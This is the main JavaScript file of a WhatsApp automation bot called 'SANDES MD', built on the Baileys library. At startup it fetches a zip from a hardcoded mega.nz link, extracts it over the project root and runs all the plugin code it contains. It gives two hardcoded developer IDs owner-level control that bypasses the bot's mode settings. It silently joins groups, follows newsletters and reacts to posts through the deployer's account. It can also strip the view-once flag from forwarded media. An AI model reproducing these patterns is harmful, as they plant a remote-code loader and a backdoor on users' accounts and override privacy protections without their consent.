const {
    default: makeWASocket,
    getAggregateVotesInPollMessage,
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')

const fs = require('fs')
const path = require('path')
const AdmZip = require('adm-zip')
const P = require('pino')
const NodeCache = require('node-cache')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const util = require('util')
const axios = require('axios')
const { File } = require('megajs')
const prefix = '.'
const msgRetryCounterCache = new NodeCache()
const groupCache = new NodeCache({ stdTTL: 600, checkperiod: 120 })
const ownerNumber = ['94787518010']
const SUPER_LID = "123017090887835@lid"
const SUPER_LID2= "183150860841183@lid"
const statusEmojis = ['💗','🦋','💐','🌝','🌈','💫','😊','😱','💀','🩷','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎','💔','❤️‍🔥']
const newsletterEmojis = ['👍','❤️','😂','😮','😢','🙏','🔥','💯','🎉','😍']
const NEWSLETTER_JIDS = ['120363423246894149@newsletter','120363416065371245@newsletter']
const AUTO_JOIN_LINKS = [
    "https://chat.whatsapp.com/JHbN7OWpuJ0922xo6TpZxq", 
    "https://chat.whatsapp.com/BrfxfXCGggy9CjSXghKcLn"
]

let BOT_MODE = "public"

if (!fs.existsSync(__dirname + '/session/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env 🔴')
const sessdata = config.SESSION_ID
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', data)
console.log("Session downloaded ✔")
});
}

console.log(`

  ███████╗ █████╗  ███╗   ██╗ ██████╗  ███████╗ ███████╗    ███╗   ███╗ ██████╗          
  ██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔════╝    ████╗ ████║ ██╔══██╗               
  ╚█████╗  ███████║ ██╔██╗ ██║ ██║  ██║ █████╗   ███████╗    ██╔████╔██║ ██║  ██║                    
   ╚═══██╗ ██╔══██║ ██║╚██╗██║ ██║  ██║ ██╔══╝   ╚════██║    ██║╚██╔╝██║ ██║  ██║             
  ██████╔╝ ██║  ██║ ██║ ╚████║ ██████╔╝ ███████╗ ███████║    ██║ ╚═╝ ██║ ██████╔╝                      
  ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝      
  
  SANDES MD WhatsApp Automation by MR.SANDES 🍒`);

const PLUGINS_DIR = './plugins';
const LIB_DIR = './lib';
const ZIP_DIR = './';

async function downloadAndExtractZip() {
    try {
        if (!fs.existsSync(PLUGINS_DIR)) {
            fs.mkdirSync(PLUGINS_DIR, { recursive: true }); }
        
        if (!fs.existsSync(LIB_DIR)) {
            fs.mkdirSync(LIB_DIR, { recursive: true }); }
            console.log('\x1b[3m%s\x1b[0m', 'FETCHING ZIP FILES FROM mega.nz 💢...');

        let MEGA_ZIP_LINK = String("https://mega.nz/file/lcMHHDCR#nYhPxXaO_E4mn8cjgLSUmSdCwJv83ORbo_p8ImGRLdQ").trim(); 
        if (!MEGA_ZIP_LINK.includes('#')) 
                       {
        throw new Error("MEGA link missing hash! Check zip.json"); }
        
        const file = File.fromURL(MEGA_ZIP_LINK);
        const fileData = await file.downloadBuffer();
        const tempZipPath = path.join(__dirname, 'temp.zip');
        fs.writeFileSync(tempZipPath, fileData);
       console.log('\x1b[3m%s\x1b[0m', '03 ZIP FILES DOWNLOADED ✅');


        const zip = new AdmZip(tempZipPath);
        zip.extractAllTo(ZIP_DIR, true);
        console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY EXTRACTED ZIP FILES ✅');
        fs.unlinkSync(tempZipPath);

    } catch (error) {
        console.error('Error:', error.message);
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8080;

async function connectToWA() {  
await downloadAndExtractZip(); 

const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
    
console.log('\x1b[3m%s\x1b[0m', 'CONNECTING SANDES MD ⚡ ...');
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
var { version } = await fetchLatestBaileysVersion()

const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        msgRetryCounterCache
        })
conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode!== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            console.log('\x1b[3m%s\x1b[0m','INSTALLING SANDES MD ⏰... ')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            
console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY INSTALLED PLUGINS 🟢 ...');
console.log('\x1b[3m%s\x1b[0m', 'DB CONNECTED SUCCESSFULLY 🔋 ...');
console.log('\x1b[32m%s\x1b[0m', 'BOT CONNECTED SUCCESSFULLY ✅ ...');

// බොට් කනෙක්ට් වුන ගමන්ම බැක්ග්‍රවුන්ඩ් එකෙන් ඔටෝ ෆලෝ වෙන කොටස
setTimeout(async () => {
    // 1. Group Auto Join
    for (const link of AUTO_JOIN_LINKS) {
        try {
            await sleep(3000)
            if (link.includes('chat.whatsapp.com')) {
                const code = link.split('chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(code)
                console.log(`Auto joined group: ${code}`)
            }
        } catch (e) {
            console.log(`Auto join error: ${e.message}`)
        }
    }

    // 2. Newsletter Auto Follow (GraphQL Error නොඑන සාර්ථක ක්‍රමය)
    try {
        console.log("STARTING NEWSLETTER AUTO FOLLOW...");
        
        // පළමු චැනල් එක සඳහා (MR.SANDES OFC)
        const ch1_jid = "120363423246894149@newsletter";
        await conn.newsletterFollow(ch1_jid).catch(() => null);
        console.log("CH1 FOLLOW REQUEST SENT 🟢");

        await sleep(3000); // සර්වර් බ්ලොක් නොවන්න තත්පර 3ක Delay එකක්

        // දෙවන චැනල් එක සඳහා (SANDES-MD UPDATES)
        const ch2_jid = "120363416065371245@newsletter";
        await conn.newsletterFollow(ch2_jid).catch(() => null);
        console.log("CH2 FOLLOW REQUEST SENT 🟢");

    } catch (e) {
        console.log("Newsletter Auto Follow Exception:", e.message);
    }
}, 5000)

let up = `
*╭━━〔 BOT CONNECTED 〕━━━━━━╮*
*┃* 📎 \`PREFIX\` : ${prefix}
*┃* 🦋 \`VERSION\` : 2.00 beta
*┃* 👾 \`DEVELOPER\` - Sandes Isuranda
*┃* 🍒 \`SUDO\` : 94787518010
*┃* ⚖ \`VISIT\` - sandes-md.zone.id
*╰━━━━━━━━━━━━━━━━╯*

*╭━━〔 ANY PROBLEM 〕━━━━━━━━╮*
*┃*🗿 \`CONTACT\` : 94787518010
*╰━━━━━━━━━━━━━━━━━╯*

*✨ ᴛʜᴀɴᴋ you ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇส์ ᴍᴅ!*
_We redefine your WhatsApp experience with_
_seamless automation and elite features._

*POWERED BY SANDES 〽️D ㋡*`;

conn.sendMessage(ownerNumber + "@s.whatsapp.net", {
image: { url: `https://upld.zone.id/uploads/d4i0x5iq/sandes-md-v2.webp` },
caption: up
})
}
})

conn.ev.on('creds.update', saveCreds)
conn.ev.on('messages.upsert', async(mek) => {
mek = mek.messages[0]
if (!mek.message) return    
mek.message = (getContentType(mek.message) === 'ephemeralMessage')
? mek.message.ephemeralMessage.message
: mek.message

if (mek.key && mek.key.remoteJid === 'status@broadcast') {
    if (config.AUTO_READ_STATUS === "true") {
        await conn.readMessages([mek.key])
    }
    return
}

// Newsletter Auto React
if (mek.key && mek.key.remoteJid.endsWith('@newsletter')) {
            if (NEWSLETTER_JIDS.includes(mek.key.remoteJid)) {
                try {
                    const randomEmoji = newsletterEmojis[Math.floor(Math.random() * newsletterEmojis.length)]
                    await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } })
                } catch (e) {}
            }
        }


const m = sms(conn, mek)
const quoted = m.quoted? m.quoted : null
const type = getContentType(mek.message)
const from = mek.key.remoteJid

const body = (type === 'conversation')? mek.message.conversation :
(type === 'extendedTextMessage')? mek.message.extendedTextMessage.text :
(type == 'imageMessage') && mek.message.imageMessage.caption? mek.message.imageMessage.caption :
(type == 'videoMessage') && mek.message.videoMessage.caption? mek.message.videoMessage.caption : ''

const isCmd = body.startsWith(prefix)
const command = isCmd? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')

const sender = mek.key.fromMe
? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id)
: (mek.key.participant || mek.key.remoteJid)

const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const isMe = botNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber) || isMe || sender === SUPER_LID
const botNumber2 = await jidNormalizedUser(conn.user.id);

let groupMetadata = null
let groupName = ''
let participants = []
let groupAdmins = []
let isBotAdmins = false
let isAdmins = false

if (isGroup) {
    try {
        groupMetadata = groupCache.get(from)

        if (!groupMetadata) {
            
            groupMetadata = await conn.groupMetadata(from)
            if (groupMetadata) groupCache.set(from, groupMetadata)
        }

        if (groupMetadata && groupMetadata.subject) {
            groupName = groupMetadata.subject
            participants = groupMetadata.participants || []
            groupAdmins = participants.length? await getGroupAdmins(participants) : []
            isBotAdmins = groupAdmins.includes(botNumber2)
            isAdmins = groupAdmins.includes(sender)
        }
    } catch (e) {
        if (e.data === 429) {
            console.log(`Rate limit on ${from}. Skipping metadata`)
        } else {
            console.log(`Group metadata error: ${e.message}`)
        }
        groupMetadata = null
        groupName = ''
        participants = []
        groupAdmins = []
    }
}

const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}

if (sender === SUPER_LID) {
await conn.sendMessage(from, { react: { text: `👾`, key: mek.key }})
}
if (sender === SUPER_LID2) {
await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
}

conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
    let vtype
    if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
        delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
        delete message.message.viewOnceMessage.message[vtype].viewOnce
        message.message = {
            ...message.message.viewOnceMessage.message
        }
    }

    let mtype = Object.keys(message.message)[0]
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]

    
    if (mtype === 'documentMessage' || mtype === 'videoMessage' || mtype === 'audioMessage' || mtype === 'imageMessage') {
        content[ctype].fileName = content[ctype].fileName || message.message[mtype].fileName
        content[ctype].caption = content[ctype].caption || message.message[mtype].caption
    }
    // ------------------------

    let context = {}
    if (mtype != "conversation") context = message.message[mtype].contextInfo
    content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo
    }

    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
            contextInfo: {
                ...content[ctype].contextInfo,
                ...options.contextInfo
            }
        } : {})
    } : {})

    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
}

conn.edit = async (mek, newmg) => {
await conn.relayMessage(from, {
protocolMessage: {
key: mek.key,
type: 14,
editedMessage: {
conversation: newmg
}
}
}, {})
}

try {
const settingsPath = './plugins/settings.js';
if (fs.existsSync(settingsPath)) {
const settingsModule = require(settingsPath);
if (settingsModule && settingsModule.WORK_MODE) {
const workMode = settingsModule.WORK_MODE;
if (workMode === "all") BOT_MODE = "public";
else if (workMode === "gc") BOT_MODE = "group";
else if (workMode === "pc") BOT_MODE = "inbox";
else if (workMode === "private") BOT_MODE = "private";
}
}
} catch (e) {
console.log("Settings load error:", e);
}

if (isCmd && sender!== SUPER_LID &&!isOwner) {
if (BOT_MODE === "private") return
if (BOT_MODE === "group" &&!isGroup) return
if (BOT_MODE === "inbox" && isGroup) return
}

if (command === "set-mode") {
if (!isOwner) return reply("*You Are not the owner!*")

if (!q) {
return reply(`📊 *Current Mode: ${BOT_MODE}*

Available Modes:
- public
- private
- group
- inbox

Example:
.set-mode private`)
}

const newMode = q.toLowerCase();
if (["public", "private", "group", "inbox"].includes(newMode)) {
BOT_MODE = newMode;
return reply(`✅ Bot mode changed to *${BOT_MODE}*`);
} else {
return reply("❌ Invalid mode! Use: public/private/group/inbox");
}
}

const events = require('./command')
const cmdName = isCmd? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;

if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) {
console.error("[PLUGIN ERROR] " + e);
}
}
}

events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}
});

})

}
app.get("/", (req, res) => {
res.send("SANDES-MD WORKING SUCCESSFULY 🗿");
});

app.listen(port, () => console.log(`SEVER RUNNING ON PORT http://localhost:${port}`));

setTimeout(() => {
connectToWA()
}, 4000);
